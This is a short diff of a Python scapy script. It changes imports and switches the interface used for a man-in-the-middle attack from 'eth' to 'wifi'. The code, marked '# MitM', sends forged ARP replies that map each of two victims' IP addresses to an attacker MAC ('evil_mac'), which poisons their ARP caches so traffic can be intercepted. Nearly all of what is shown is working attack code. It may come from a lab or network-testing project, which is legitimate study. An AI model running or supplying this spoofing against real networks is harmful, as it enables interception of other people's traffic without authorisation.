@@ -1,4 +1,5 @@
-from scapy.all import Ether, IP, ARP
+from scapy.layers.l2 import Ether, ARP
+from scapy.layers.inet import IP
 from scapy.all import sendp
 
 if __name__ == '__main__':
@@ -18,5 +19,5 @@ if __name__ == '__main__':
     sendp(Ether(src=mac2) / IP(src=ip2), iface=eth)
 
     # MitM
-    sendp(Ether(src=evil_mac, dst=mac1) / ARP(op=2, hwdst=mac1, pdst=ip1, hwsrc=evil_mac, psrc=ip2), iface=eth)
-    sendp(Ether(src=evil_mac, dst=mac2) / ARP(op=2, hwdst=mac2, pdst=ip2, hwsrc=evil_mac, psrc=ip1), iface=eth)
+    sendp(Ether(src=evil_mac, dst=mac1) / ARP(op=2, hwdst=mac1, pdst=ip1, hwsrc=evil_mac, psrc=ip2), iface=wifi)
+    sendp(Ether(src=evil_mac, dst=mac2) / ARP(op=2, hwdst=mac2, pdst=ip2, hwsrc=evil_mac, psrc=ip1), iface=wifi)
